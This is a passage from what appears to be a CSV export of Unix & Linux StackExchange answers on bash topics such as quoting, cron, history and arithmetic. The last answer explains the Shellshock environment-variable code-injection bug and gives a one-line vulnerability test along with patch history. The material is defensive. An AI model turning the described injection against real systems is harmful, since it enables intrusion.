<p>Although this is not a great example if you are happy with using bash's special <code>\d</code> or <code>\D{format}</code> prompt escapes -- which are not the topic of the question but can be found in <code>man bash</code> under <code>PROMPTING</code>.  There are various other useful escapes such as <code>\w</code> for current directory, <code>\u</code> for current user, etc.</p>

<hr>

<p><sup>1. The main portion of this chart, colors 16 - 231 (notice they are not in numerical order) are a 6 x 6 x 6 RGB color cube. ""Color cube"" refers to the fact that an RGB color space can be represented using a three dimensional array (with one axis for red, one for green, and one for blue).  Each color in the cube here can be represented as coordinates in a 6 x 6 x 6 array, and the index in the chart calculated thusly:</sup></p>

<pre><code>    16 + R * 36 + G * 6 + B
</code></pre>

<p><sup>The first color in the cube, at index 16 in the chart, is black (RGB 0, 0, 0).  You could use this formula in shell script:</sup></p>

<pre><code>#!/bin/sh                                                         

function RGBcolor {                                               
    echo ""16 + $1 * 36 + $2 * 6 + $3"" | bc                        
}                                                                 

fg=$(RGBcolor 1 0 2)  # Violet                                            
bg=$(RGBcolor 5 3 0)  # Bright orange.                                            

echo -e ""\\033[1;38;5;$fg;48;5;${bg}mviolet on tangerine\\033[0m""
</code></pre>
"
"Are there naming conventions for variables in shell scripts?","42847","<bash><shell-script><shell><variable>","158","<p>Environment variables or shell variables that are introduced by the operating system, shell startup scripts, or by the shell itself etc. are usually all in <code>CAPITALS</code>.</p>

<p>To prevent your own variables from conflicting with these variables, it is a good practice to use <code>lower_case</code> variable names.</p>
"
"How to uppercase the command line argument?","51983","<bash><string><case-sensitivity>","152","<p>The syntax <code>str^^</code> which you are trying is available from Bash 4.0 and above. Perhaps yours is an older version (or you ran the script with <code>sh</code> explicitly):</p>

<p>Try this:</p>

<pre><code>str=""Some string""
printf '%s\n' ""$str"" | awk '{ print toupper($0) }'
</code></pre>
"
"Temporarily suspend bash_history on a given shell?","10922","<bash><command-history>","146","<p>This should be what you're looking for:</p>

<pre><code>unset HISTFILE
</code></pre>

<h3>From <code>man bash</code></h3>

<blockquote>
  <p>If HISTFILE is unset, or if the history file is unwritable, the history is not saved.</p>
</blockquote>

<p>Alternatively, if you want to toggle it off and then back on again, it may be easier to use <a href=""https://ss64.com/bash/set.html"" rel=""noreferrer""><code>set</code></a>:</p>

<h3>Turn Off</h3>

<pre><code>set +o history
</code></pre>

<h3>Turn on</h3>

<pre><code>set -o history
</code></pre>
"
"How do I add X days to date and get new date?","49053","<linux><bash><shell-script><date>","142","<p>You can just use the <code>-d</code> switch and provide a date to be calculated</p>

<pre><code>date
Sun Sep 23 08:19:56 BST 2012
NEW_expration_DATE=$(date -d ""+10 days"")
echo $NEW_expration_DATE
Wed Oct 3 08:12:33 BST 2012 
</code></pre>

<blockquote>
<pre><code>  -d, --date=STRING
          display time described by STRING, not ‘now’
</code></pre>
</blockquote>

<p>This is quite a powerful tool as you can do things like </p>

<pre><code>date -d ""Sun Sep 11 07:59:16 IST 2012+10 days""
Fri Sep 21 03:29:16 BST 2012
</code></pre>

<p>or</p>

<pre><code>TZ=IST date -d ""Sun Sep 11 07:59:16 IST 2012+10 days""
Fri Sep 21 07:59:16 IST 2012
</code></pre>

<p>or</p>

<pre><code>prog_end_date=`date '+%C%y%m%d' -d ""$end_date+10 days""`
</code></pre>

<p>So if $end_date=20131001 then $prog_end_date=20131011</p>
"
"When is double-quoting necessary?","68694","<bash><shell><shell-script><zsh><quoting>","139","<p>First, separate zsh from the rest. It's not a matter of old vs modern shells: zsh behaves differently. The zsh designers decided to make it incompatible with traditional shells (Bourne, ksh, bash), but easier to use.</p>

<p>Second, it is far easier to use double quotes all the time than to remember when they are needed. They are needed most of the time, so you'll need to learn when they aren't needed, not when they are needed.</p>

<p>In a nutshell, <strong>double quotes are necessary wherever a list of words or a pattern is expected</strong>. They are optional in contexts where a raw string is expected by the parser.</p>

<h3>What happens without quotes</h3>

<p>Note that without double quotes, two things happen.</p>

<ol>
<li>First, the result of the expansion (the value of the variable for a parameter substitution like <code>${foo}</code>, or the output of the command for a command substitution like <code>$(foo)</code>) is split into words wherever it contains whitespace.<br>
More precisely, the result of the expansion is split at each character that appears in the value of the <code>IFS</code> variable (separator character). If a sequence of separator characters contains whitespace (space, tab or newline), the whitespace is counts as a single character; leading, trailing or repeated non-whitespace separators lead to empty fields. For example, with <code>IFS="" :""</code>, <code>:one::two : three: :four </code> produces empty fields before <code>one</code>, between <code>one</code> and <code>two</code>, and (a single one) between <code>three</code> and <code>four</code>.</li>
<li>Each field that results from splitting is interpreted as a glob (a wildcard pattern) if it contains one of the characters <code>\[*?</code>. If that pattern matches one or more file names, the pattern is replaced by the list of matching file names.</li>
</ol>

<p>An unquoted variable expansion <code>$foo</code> is colloquially known as the “split+glob operator”, in contrast with <code>""$foo""</code> which just takes the value of the variable <code>foo</code>. The same goes for command substitution: <code>""$(foo)""</code> is a command substitution, <code>$(foo)</code> is a command substitution followed by split+glob.</p>

<h3>Where you can omit the double quotes</h3>

<p>Here are all the cases I can think of in a Bourne-style shell where you can write a variable or command substitution without double quotes, and the value is interpreted literally.</p>

<ul>
<li><p>On the right-hand side of an assignment.</p>

<pre><code>var=$stuff
a_single_star=*
</code></pre>

<p>Note that you do need the double quotes after <code>export</code>, because it's an ordinary builtin, not a keyword. This is only true in some shells such as dash, zsh (in sh emulation), yash or posh; bash and ksh both treat <code>export</code> specially.</p>

<pre><code>export VAR=""$stuff""
</code></pre></li>
<li><p>In a <code>case</code> statement.</p>

<pre><code>case $var in …
</code></pre>

<p>Note that you do need double quotes in a case pattern. Word splitting doesn't happen in a case pattern, but an unquoted variable is interpreted as a pattern whereas a quoted variable is interpreted as a literal string.</p>

<pre><code>a_star='a*'
case $var in
  ""$a_star"") echo ""'$var' is the two characters a, *"";;
   $a_star) echo ""'$var' begins with a"";;
esac
</code></pre></li>
<li><p>Within double brackets. Double brackets are shell special syntax.</p>

<pre><code>[[ -e $filename ]]
</code></pre>

<p>Except that you do need double quotes where a pattern or regular expression is expected: on the right-hand side of <code>=</code> or <code>==</code> or <code>!=</code> or <code>=~</code>.</p>

<pre><code>a_star='a*'
if [[ $var == ""$a_star"" ]]; then echo ""'$var' is the two characters a, *""
elif [[ $var == $a_star ]]; then echo ""'$var' begins with a""
fi
</code></pre>

<p>You do need double quotes as usual within single brackets <code>[ … ]</code> because they are ordinary shell syntax (it's a command that happens to be called <code>[</code>). See <a href=""https://unix.stackexchange.com/questions/32210/using-single-or-double-bracket-bash/32227#32227"">Single or double brackets</a></p></li>
<li><p>In a redirection in non-interactive POSIX shells (not <code>bash</code>, nor <code>ksh88</code>).</p>

<pre><code>echo ""hello world"" &gt;$filename
</code></pre>

<p>Some shells, when interactive, do treat the value of the variable as a wildcard pattern. POSIX prohibits that behaviour in non-interactive shells, but a few shells including bash (except in POSIX mode) and ksh88  (including when found as the (supposedly) POSIX <code>sh</code> of some commercial Unices like Solaris) still do it there (<code>bash</code> does also attempt <em>splitting</em> and the redirection fails unless that <em>split+globbing</em> results in exactly one word), which is why it's better to quote targets of redirections in a <code>sh</code> script in case you want to convert it to a <code>bash</code> script some day, or run it on a system where <code>sh</code> is non-compliant on that point, or it may be <em>sourced</em> from interactive shells.</p></li>
<li><p>Inside an arithmetic expression. In fact, you need to leave the quotes out in order for a variable to be parsed as an arithmetic expression.</p>

<pre><code>expr=2*2
echo ""$(($expr))""
</code></pre>

<p>However, you do need the quotes around the arithmetic expansion as they are subject to word splitting in most shells as POSIX requires (!?).</p></li>
<li><p>In an associative array subscript.</p>

<pre><code>typeset -A a
i='foo bar*qux'
a[foo\ bar\*qux]=hello
echo ""${a[$i]}""
</code></pre></li>
</ul>

<p>An unquoted variable and command substitution can be useful in some rare circumstances:</p>

<ul>
<li>When the variable value or command output consists of a list of glob patterns and you want to expand these patterns to the list of matching files.</li>
<li>When you know that the value doesn't contain any wildcard character, that <code>$IFS</code> was not modified and you want to split it at whitespace characters.</li>
<li>When you want to split a value at a certain character: disable globbing with <code>set -f</code>, set <code>IFS</code> to the separator character (or leave it alone to split at whitespace), then do the expansion.</li>
</ul>

<h3>Zsh</h3>

<p>In zsh, you can omit the double quotes most of the times, with a few exceptions.</p>

<ul>
<li><p><code>$var</code> never expands to multiple words, however it expands to the empty list (as opposed to a list containing a single, empty word) if the value of <code>var</code> is the empty string. Contrast:</p>

<pre><code>var=
print -l $var foo        # prints just foo
print -l ""$var"" foo      # prints an empty line, then foo
</code></pre>

<p>Similarly, <code>""${array[@]}""</code> expands to all the elements of the array, while <code>$array</code> only expands to the non-empty elements.</p></li>
<li><p>The <code>@</code> parameter expansion flag sometimes requires double quotes around the whole substitution: <code>""${(@)foo}""</code>.</p></li>
<li><p>Command substitution undergoes field splitting if unquoted: <code>echo $(echo 'a'; echo '*')</code> prints <code>a *</code> (with a single space) whereas <code>echo ""$(echo 'a'; echo '*')""</code> prints the unmodified two-line string. Use <code>""$(somecommand)""</code> to get the output of the command in a single word, sans final newlines. Use <code>""${$(somecommand; echo _)%?}""</code> to get the exact output of the command including final newlines. Use <code>""${(@f)$(somecommand)}""</code> to get an array of lines from the command's output.</p></li>
</ul>
"
"How can I execute local script on remote machine and include arguments?","87405","<bash><shell-script><shell><scripting><options>","138","<p>You were pretty close with your example. It works just fine when you use it with arguments such as these.</p>

<p><em><strong>Sample script:</em></strong></p>

<pre><code>$ more ex.bash 
#!/bin/bash

echo $1 $2
</code></pre>

<p><em><strong>Example that works:</em></strong></p>

<pre><code>$ ssh serverA ""bash -s"" &lt; ./ex.bash ""hi"" ""bye""
hi bye
</code></pre>

<p>But it fails for these types of arguments:</p>

<pre><code>$ ssh serverA ""bash -s"" &lt; ./ex.bash ""--time"" ""bye""
bash: --: invalid option
...
</code></pre>

<h3>What's going on?</h3>

<p>The problem you're encountering is that the argument, <code>-time</code>, or <code>--time</code> in my example, is being interpreted as a switch to <code>bash -s</code>. You can pacify <code>bash</code> by terminating it from taking any of the remaining command line arguments for itself using the <code>--</code> argument.</p>

<p>Like this:</p>

<pre><code>$ ssh root@remoteServer ""bash -s"" -- &lt; /var/www/html/ops1/sysMole -time Aug 18 18
</code></pre>

<h3>Examples</h3>

<p><em>#1:</em></p>

<pre><code>$ ssh serverA ""bash -s"" -- &lt; ./ex.bash ""-time"" ""bye""
-time bye
</code></pre>

<p><em>#2:</em></p>

<pre><code>$ ssh serverA ""bash -s"" -- &lt; ./ex.bash ""--time"" ""bye""
--time bye
</code></pre>

<p><em>#3:</em></p>

<pre><code>$ ssh serverA ""bash -s"" -- &lt; ./ex.bash --time ""bye""
--time bye
</code></pre>

<p><em>#4:</em></p>

<pre><code>$ ssh  &lt; ./ex.bash serverA ""bash -s -- --time bye""
--time bye
</code></pre>

<p><strong>NOTE:</strong> Just to make it clear that wherever the redirection appears on the command line makes no difference, because <code>ssh</code> calls a remote shell with the concatenation of its arguments anyway, quoting doesn't make much difference, except when you need quoting on the remote shell like in example <em>#4:</em></p>

<pre><code>$ ssh  &lt; ./ex.bash serverA ""bash -s -- '&lt;--time bye&gt;' '&lt;end&gt;'""
&lt;--time bye&gt; &lt;end&gt;
</code></pre>
"
"What is the difference between ""sort -u"" and ""sort | uniq""?","76049","<bash><sort><uniq>","138","<p><code>sort | uniq</code> existed before <code>sort -u</code>, and is compatible with a wider range of systems, although almost all modern systems do support <code>-u</code> -- it's POSIX. It's mostly a throwback to the days when <code>sort -u</code> didn't exist (and people don't tend to change their methods if the way that they know continues to work, just look at <code>ifconfig</code> vs. <code>ip</code> adoption).</p>

<p>The two were likely merged because removing duplicates within a file requires sorting (at least, in the standard case), and is an extremely common use case of sort. It is also faster internally as a result of being able to do both operations at the same time (and due to the fact that it doesn't require IPC between <code>uniq</code> and <code>sort</code>). Especially if the file is big, <code>sort -u</code> will likely use fewer intermediate files to sort the data.</p>

<p>On my system I consistently get results like this:</p>

<pre><code>$ dd if=/dev/urandom of=/dev/shm/file bs=1M count=100
100+0 records in
100+0 records out
104857600 bytes (105 MB) copied, 8.95208 s, 11.7 MB/s
$ time sort -u /dev/shm/file &gt;/dev/null

real        0m0.500s
user        0m0.767s
sys         0m0.167s
$ time sort /dev/shm/file | uniq &gt;/dev/null

real        0m0.772s
user        0m1.137s
sys         0m0.273s
</code></pre>

<p>It also doesn't mask the return code of <code>sort</code>, which may be important (in modern shells there are ways to get this, for example, <code>bash</code>'s <code>$PIPESTATUS</code> array, but this wasn't always true).</p>
"
"Have backticks (i.e. `cmd`) in *sh shells been deprecated?","126927","<bash><shell-script><shell><scripting><zsh>","135","<p>There are two different meanings of ""deprecated.""</p>

<blockquote>
  <p><strong>be deprecated:</strong> (chiefly of a software feature) be usable but regarded as obsolete and best avoided, typically due to having been superseded.</p>
  
  <p>—New Oxford American Dictionary</p>
</blockquote>

<p>By this definition backticks <em>are</em> deprecated.</p>

<blockquote>
  <p>Deprecated status <strong>may also</strong> indicate the feature will be removed in the future.</p>
  
  <p>—<a href=""https://en.wikipedia.org/wiki/Deprecation"" rel=""noreferrer"">Wikipedia</a></p>
</blockquote>

<p>By this definition backticks are <em>not</em> deprecated.</p>

<h3>Still supported:</h3>

<p>Citing the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_03"" rel=""noreferrer"">Open Group Specification on Shell Command Languages</a>,
specifically section ""2.6.3 Command Substitution,"" it can be seen that both forms of command substitution, backticks (<code>`..cmd..`</code>) or dollar parens (<code>$(..cmd..)</code>) are still supported insofar as the specification goes.</p>

<p><em>excerpt</em></p>

<blockquote>
  <p>Command substitution allows the output of a command to be substituted in place
  of the command name itself. Command substitution shall occur when the command
  is enclosed as follows:</p>

<pre><code>          $(command)

          or (backquoted version):

          `command`
</code></pre>
  
  <p>The shell shall expand the command substitution by executing command in a
  subshell environment (see Shell Execution Environment) and replacing the
  command substitution (the text of command plus the enclosing <code>$()</code> or
  backquotes) with the standard output of the command, removing sequences of one
  or more &lt;newline> characters at the end of the substitution. Embedded &lt;newline> characters before the end of the output shall not be removed; however, 
  they may be treated as field delimiters and eliminated during field splitting, 
  depending on the value of IFS and quoting that is in effect. If the output 
  contains any null bytes, the behavior is unspecified.</p>
  
  <p>Within the backquoted style of command substitution, <em>&lt;backslash></em> shall retain
  its literal meaning, except when followed by: '$', '<code>\`</code>', or <em>&lt;backslash></em>. The
  search for the matching backquote shall be satisfied by the first unquoted
  non-escaped backquote; during this search, if a non-escaped backquote is
  encountered within a shell comment, a here-document, an embedded command
  substitution of the <code>$(command)</code> form, or a quoted string, undefined results
  occur. A single-quoted or double-quoted string that begins, but does not end,
  within the ""<code>`...`</code>"" sequence produces undefined results.</p>
  
  <p>With the <code>$(command)</code> form, all characters following the open parenthesis to
  the matching closing parenthesis constitute the command. Any valid shell 
  script can be used for command, except a script consisting solely of
  re-directions which produces unspecified results.</p>
</blockquote>

<h3>So then why does everyone say that backticks have been deprecated?</h3>

<p>Because most of the use cases <strong><em>should</em></strong> be making use of the dollar parens form instead of backticks.  (Deprecated in the first sense above.)  Many of the most reputable sites (including U&amp;L) often state this as well, throughout, so it's sound advice.  This advice should not be confused with some non-existent plan to remove support for backticks from shells.</p>

<ul>
<li><p><a href=""http://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">BashFAQ #082 - Why is $(...) preferred over &#96;...&#96; (backticks)?</a></p>

<p><em>excerpt</em></p>

<blockquote>
  <p><code>`...`</code> is the legacy syntax required by only the very oldest of
  non-POSIX-compatible bourne-shells. There are several reasons to always
  prefer the <code>$(...)</code> syntax:</p>
  
  <p>...</p>
</blockquote></li>
<li><p><a href=""http://wiki.bash-hackers.org/scripting/obsolete"" rel=""noreferrer"">Bash Hackers Wiki - Obsolete and deprecated syntax</a></p>

<p><em>excerpt</em></p>

<blockquote>
  <p>This is the older Bourne-compatible form of the <a href=""http://wiki.bash-hackers.org/syntax/expansion/cmdsubst"" rel=""noreferrer"">command substitution</a>.
  Both the <code>`COMMANDS`</code> and <code>$(COMMANDS)</code> syntaxes are specified by POSIX, 
  but the latter is <em>greatly</em> preferred, though the former is unfortunately 
  still very prevalent in scripts. New-style command substitutions are widely 
  implemented by every modern shell (and then some). The only reason for using 
  backticks is for compatibility with a real Bourne shell (like Heirloom). 
  Backtick command substitutions require special escaping when nested, and 
  examples found in the wild are improperly quoted more often than not. See: 
  <a href=""http://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">Why is $(...) preferred over &#96;...&#96; (backticks)?</a>.</p>
</blockquote></li>
<li><p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/xrat/V4_xcu_chap02.html#tag_23_02_06_03"" rel=""noreferrer"">POSIX standard rationale</a></p>

<p><em>excerpt</em></p>

<blockquote>
  <p>Because of these inconsistent behaviors, the backquoted variety of command substitution is not recommended for new applications that nest command substitutions or attempt to embed complex scripts.</p>
</blockquote></li>
</ul>

<p><strong>NOTE:</strong> This third excerpt (above) goes on to show several situations where backticks simply won't work, but the newer dollar parens method does, beginning with the following paragraph:</p>

<blockquote>
  <p>Additionally, the backquoted syntax has historical restrictions on the contents of the embedded command. While the newer ""$()"" form can process any kind of valid embedded script, the backquoted form cannot handle some valid scripts that include backquotes. </p>
</blockquote>

<p>If you continue reading that section the failures are highlighted showing how they would fail using backticks, but do work using the newer dollar parens notation.</p>

<h3>Conclusions</h3>

<p>So it's preferable that you use dollar parens instead of backticks but you aren't actually using something that's been technically ""deprecated"" as in ""this will stop working entirely at some planned point.""</p>

<p>After reading all this you should have the take away that you're strongly encouraged to use dollar parens unless you <em>specifically</em> require compatibility with a real original non-POSIX Bourne shell.</p>
"
"Generate File of a certain size?","101332","<bash><command-line><files>","135","<p>You can use dd:</p>

<pre><code>dd if=/dev/zero of=output.dat  bs=24M  count=1
</code></pre>

<p>or</p>

<pre><code>dd if=/dev/zero of=output.dat  bs=1M  count=24
</code></pre>

<p>or, on Mac,</p>

<pre><code>dd if=/dev/zero of=output.dat  bs=1m  count=24
</code></pre>
"
"Is there any way to execute commands from history?","275053","<bash><command-history>","133","<p>In bash, just <code>!636</code> will be ok.</p>
"
"How to run a program in a clean environment in bash?","48994","<bash><environment-variables>","133","<p>You can do this with <code>env</code>:</p>

<pre><code>env -i your_command
</code></pre>

<p>Contrary to comments below, this <em>does</em> completely clear out the environment, but it does not prevent <code>your_command</code> setting new variables. In particular, running a shell will cause the <code>/etc/profile</code> to run, and the shell may have some built in settings also.</p>

<p>You can check this with:</p>

<pre><code>env -i env
</code></pre>

<p>i.e. wipe the environment and then print it. The output will be blank.</p>
"
"How to redirect output to a file from within cron?","52330","<bash><io-redirection><cron>","131","<p>I solved the problem. There are two ways:</p>

<p><strong>M1</strong></p>

<p>Change the redirection from <code>&amp;&gt;&gt;</code> to <code>2&gt;&amp;1</code>. So now <code>crontab -e</code> looks like</p>

<pre><code>*/1 * * * * /home/ranveer/vimbackup.sh &gt;&gt; /home/ranveer/vimbackup.log 2&gt;&amp;1
</code></pre>

<p><strong>I believe</strong> the above works because by default <code>cron</code> is using <code>sh</code> to run the task instead of <code>bash</code> so <code>&amp;&gt;&gt;</code> is not supported by <code>sh</code>.</p>

<p><strong>M2</strong></p>

<p>Change the default shell by adding <code>SHELL=/bin/bash</code> in the <code>crontab -e</code> file.</p>
"
"Can't use exclamation mark (!) in bash?","33339","<bash><quoting><special-characters>","130","<p>The exclamation mark is part of history expansion in bash.  To use it you need it enclosed in single quotes (eg: <code>'http://example.org/!132'</code>) or to directly escape it with a backslash (<code>\</code>) before the character (eg: <code>""http://example.org/\!132""</code>).</p>

<p>Note that in double quotes, a backslash before the exclam prevents history expansion, BUT the backslash is not removed in such a case.  So it's better to use single quotes, so you're not passing a literal backslash to <code>curl</code> as part of the URL.</p>
"
"How do I delete the first n lines of an ascii file using shell commands?","37790","<bash><shell-script><text-processing>","130","<p>As long as the file is not a symlink or hardlink, you can use sed, tail, or awk. Example below.</p>

<pre><code>$ cat t.txt
12
34
56
78
90
</code></pre>

<h2>sed</h2>

<pre><code>$ sed -e '1,3d' &lt; t.txt
78
90
</code></pre>

<p>You can also use sed in-place without a temp file: <code>sed -i -e 1,3d yourfile</code>. This won't echo anything, it will just modify the file in-place. If you don't need to pipe the result to another command, this is easier.</p>

<h2>tail</h2>

<pre><code>$ tail -n +4 t.txt
78
90
</code></pre>

<h2>awk</h2>

<pre><code>$ awk 'NR &gt; 3 { print }' &lt; t.txt
78
90
</code></pre>
"
"how can I add (subtract, etc.) two numbers with bash?","93029","<bash><scripting><variable>","126","<p><a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_06_04"" rel=""noreferrer"">Arithmetic in POSIX shells</a> is done with <code>$</code> and double parentheses <code>(( ))</code>:</p>

<pre><code>echo ""$(($num1+$num2))""
</code></pre>

<p>You can assign from that (sans <code>echo</code>):</p>

<pre><code>num1=""$(($num1+$num2))""
</code></pre>

<p>There is also <code>expr</code>:</p>

<pre><code>expr $num1 + $num2
</code></pre>

<p>In scripting <code>$(())</code> is preferable since it avoids a fork/execute for the <code>expr</code> command.</p>
"
"What is the purpose of the hash command?","86012","<bash><history>","125","<p><code>hash</code> is a bash built-in command. The hash table is a feature of <code>bash</code>  that prevents it from having to search <code>$PATH</code> every time you type a command by caching the results in memory. The table gets cleared on events that obviously invalidate the results (such as modifying <code>$PATH</code>)</p>

<p>The <code>hash</code> command is just how you interact with that system (for whichever reason you feel you need to).</p>

<p>Some use cases:</p>

<ul>
<li><p>Like you saw it prints out how many times you hit which commands if you type it with no arguments. This might tell you which commands you use most often.</p></li>
<li><p>You can also use it to remember executables in non-standard locations. </p></li>
</ul>

<p>Example:</p>

<pre><code>[root@policyServer ~]# hash -p /lol-wut/whoami whoami
[root@policyServer ~]# whoami
Not what you're thinking
[root@policyServer ~]# which whoami
/usr/bin/whoami
[root@policyServer ~]# /usr/bin/whoami
root
[root@policyServer ~]#
</code></pre>

<p>Which might be useful if you just have a single executable in a directory outside of <code>$PATH</code> that you want to run by just type the name instead of including everything in that directory (which would be the effect if you added it to <code>$PATH</code>).</p>

<p>An alias can usually do this as well, though and since you're modifying the current shell's behavior, it isn't mapped in programs you kick off. A symlink to the lone executable is probably the preferable option here. <code>hash</code> is one way of doing it.</p>

<ul>
<li>You can use it to un-remember file paths. This is useful if a new executable pops up in an earlier <code>PATH</code> directory or gets <code>mv</code>'d to somewhere else and you want to force bash to go out and find it again instead of the last place it remembers finding it. </li>
</ul>

<p>Example:</p>

<pre><code>[root@policyServer ~]# hash
hits    command
   1    /bin/ls
[root@policyServer ~]# cp /bin/ls /lol-wut
[root@policyServer ~]# hash
hits    command
   1    /bin/cp
   1    /bin/ls
[root@policyServer ~]# hash -d ls
[root@policyServer ~]# ls
default.ldif  newDIT.ldif  notes.txt  users.ldif
[root@policyServer ~]# hash
hits    command
   1    /bin/cp
   1    /lol-wut/ls
[root@policyServer ~]#
</code></pre>

<p>The <code>cp</code> command caused a new version of the <code>ls</code> executable to show up earlier in my <code>$PATH</code> but didn't trigger a purge of the hash table. I used <code>hash -d</code> to selectively purge the entry for <code>ls</code> from the hash table. Bash was then forced to look through <code>$PATH</code> again and when it did, it found it in the newer location (earlier in $PATH than it was running before).</p>

<p>You can selectively invoke this ""find new location of executable from <code>$PATH</code>"" behavior, though:</p>

<pre><code>[root@policyServer ~]# hash
hits    command
   1    /bin/ls
[root@policyServer ~]# hash ls
[root@policyServer ~]# hash
hits    command
   0    /lol-wut/ls
[root@policyServer ~]#
</code></pre>

<p>You'd mostly just want to do this if you wanted something out of the hash table and weren't 100% that you could logout and then back in successfully, or you wanted to preserve some modifications you've made to your shell.</p>

<p>To get rid of stale mappings, you can also do <code>hash -r</code> (or <code>export PATH=$PATH</code>) which effectively just purges bash's entire hash table. </p>

<p>There are lots of little situations like that. I don't know if I'd call it one of the ""most useful"" commands but it does have some use cases. </p>
"
"What is the difference between ""&&"" and "";"" when chaining commands","37069","<bash><shell>","124","<p>Assume there is <code>command1 &amp;&amp; command2</code>.</p>

<p>In this case <code>command2</code> will be executed if and only if <code>command1</code> returned zero exit status.</p>

<p><code>;</code> is just a command separator. Thus <code>command2</code> will be executed whatever <code>command1</code> returned.</p>

<pre><code>$&gt; [[ ""a"" = ""b"" ]] &amp;&amp; echo ok 

$&gt; [[ ""a"" = ""b"" ]]; echo ok 
ok
</code></pre>
"
"Is there a "".bashrc"" equivalent file read by all shells?","3052","<bash><environment-variables><profile>","123","<p>The file <code>$HOME/.profile</code> is used by a number of shells, including bash, sh, dash, and possibly others.</p>

<p>From the bash man page:</p>

<blockquote>
  <p>When bash is invoked as an interactive login shell, ... it first reads and executes commands from the file /etc/profile, if that file exists.   After  reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile, in that order, and reads and executes commands from the first one that exists and is readable.</p>
</blockquote>

<p>csh and tcsh explicitly don't look at <code>~/.profile</code> but those shells are kinda antiquated.</p>
"
"When was the shellshock (CVE-2014-6271/7169) bug introduced, and what is the patch that fully fixes it?","157381","<bash><security><shellshock>","122","<h2>TL;DR</h2>

<p>The shellshock vulnerability is fully fixed in</p>

<ul>
<li>On the bash-2.05b branch: 2.05b.10 and above (patch 10 included)</li>
<li>On the bash-3.0 branch: 3.0.19 and above (patch 19 included)</li>
<li>On the bash-3.1 branch: 3.1.20 and above (patch 20 included)</li>
<li>On the bash-3.2 branch: 3.2.54 and above (patch 54 included)</li>
<li>On the bash-4.0 branch: 4.0.41 and above (patch 41 included)</li>
<li>On the bash-4.1 branch: 4.1.14 and above (patch 14 included)</li>
<li>On the bash-4.2 branch: 4.2.50 and above (patch 50 included)</li>
<li>On the bash-4.3 branch: 4.3.27 and above (patch 27 included)</li>
</ul>

<p>If your bash shows an older version, your OS vendor may still have patched it by themselves, so best is to check.</p>

<p>If:</p>

<pre><code>env xx='() { echo vulnerable; }' bash -c xx
</code></pre>

<p>shows ""vulnerable"", you're still vulnerable. That is the only test that is relevant (whether the bash parser is still exposed to code in <em>any</em> environment variable).</p>

<h2>Details.</h2>

<p>The bug was in the initial implementation of the function exporting/importing introduced on the 5<sup>th</sup> of August 1989 by Brian Fox, and first released in bash-1.03 about a month later at a time where bash was not in such widespread use, before security was that much of a concern and HTTP and the web or Linux even existed.</p>

<p>From the <a href=""http://www.oldlinux.org/Linux.old/bin/old/bash-1.05/ChangeLog"" rel=""nofollow noreferrer"">ChangeLog in 1.05</a>:</p>

<blockquote>
<pre><code>Fri Sep  1 18:52:08 1989  Brian Fox  (bfox at aurel)

       * readline.c: rl_insert ().  Optimized for large amounts
         of typeahead.  Insert all insertable characters at once.

       * I update this too irregularly.
         Released 1.03.
[...]
Sat Aug  5 08:32:05 1989  Brian Fox  (bfox at aurel)

       * variables.c: make_var_array (), initialize_shell_variables ()
         Added exporting of functions.
</code></pre>
</blockquote>

<p>Some discussions in <a href=""https://groups.google.com/d/msg/gnu.bash.bug/72jXoIWYsfE/jJqC-fjSh0wJ"" rel=""nofollow noreferrer"">gnu.bash.bug</a> and <a href=""https://groups.google.com/d/msg/comp.unix.questions/LwsdchovzFY/qokUr2mfCboJ"" rel=""nofollow noreferrer"">comp.unix.questions</a> around that time also mention the feature.</p>

<p>It's easy to understand how it got there.</p>

<p>bash exports the functions in env vars like</p>

<pre><code>foo=() {
  code
}
</code></pre>

<p>And on import, all it has to do is interpret that with the <code>=</code> replaced with a space... except that it should not blindly interpret it.</p>

<p>It's also broken in that in <code>bash</code> (contrary to the Bourne shell), scalar variables and functions have a different name space. Actually if you have</p>

<pre><code>foo() { echo bar; }; export -f foo
export foo=bar
</code></pre>

<p><code>bash</code> will happily put both in the environment (yes entries with same variable name) but many tools (including many shells) won't propagate them.</p>

<p>One would also argue that bash should use a <code>BASH_</code> namespace prefix for that as that's env vars only relevant from bash to bash. <code>rc</code> uses a <code>fn_</code> prefix for a similar feature.</p>

<p>A better way to implement it would have been to put the definition of all exported variables in a variable like:</p>

<pre><code>BASH_FUNCDEFS='f1() { echo foo;}
  f2() { echo bar;}...'
</code></pre>

<p>That would still need to be sanitized but at least that could not be more exploitable than <code>$BASH_ENV</code> or <code>$SHELLOPTS</code>...</p>

<p>There is a patch that prevents <code>bash</code> from interpreting anything else than the function definition in there (<a href=""https://lists.gnu.org/archive/html/bug-bash/2014-09/msg00081.html"" rel=""nofollow noreferrer"">https://lists.gnu.org/archive/html/bug-bash/2014-09/msg00081.html</a>), and that's the one that has been applied in all the security updates from the various Linux distributions.</p>

<p>However, bash still interprets the code in there and any bug in the interpreter could be exploited. One such bug <a href=""http://thread.gmane.org/gmane.comp.security.oss.general/13851"" rel=""nofollow noreferrer"">has already been found</a> (CVE-2014-7169) though its impact is a lot smaller. So there will be another patch coming soon.</p>

<p>Until a hardening fix that prevents bash to interpret code in any variable (like using the <code>BASH_FUNCDEFS</code> approach above), we won't know for sure if we're not vulnerable from a bug in the bash parser. And I believe there will be such a hardening fix released sooner or later.</p>

<h2>Edit 2014-09-28</h2>

<p>Two additional bugs in the parser have been found (CVE-2014-718{6,7}) (note that most shells are bound to have bugs in their parser for corner cases, that wouldn't have been a concern if that parser hadn't been exposed to untrusted data).</p>

<p>While all 3 bugs 7169, 7186 and 7187 have been fixed in following patches, Red Hat pushed for the hardening fix. In their patch, they changed the behaviour so that functions were exported in variables called <code>BASH_FUNC_myfunc()</code> more or less preempting Chet's design decision.</p>

<p>Chet later <a href=""http://thread.gmane.org/gmane.comp.shells.bash.bugs/22190"" rel=""nofollow noreferrer"">published that fix as an official upstreams bash patch</a>.</p>

<p>That hardening patch, or variants of it are now available for most major Linux distribution and eventually made it to Apple OS/X.</p>

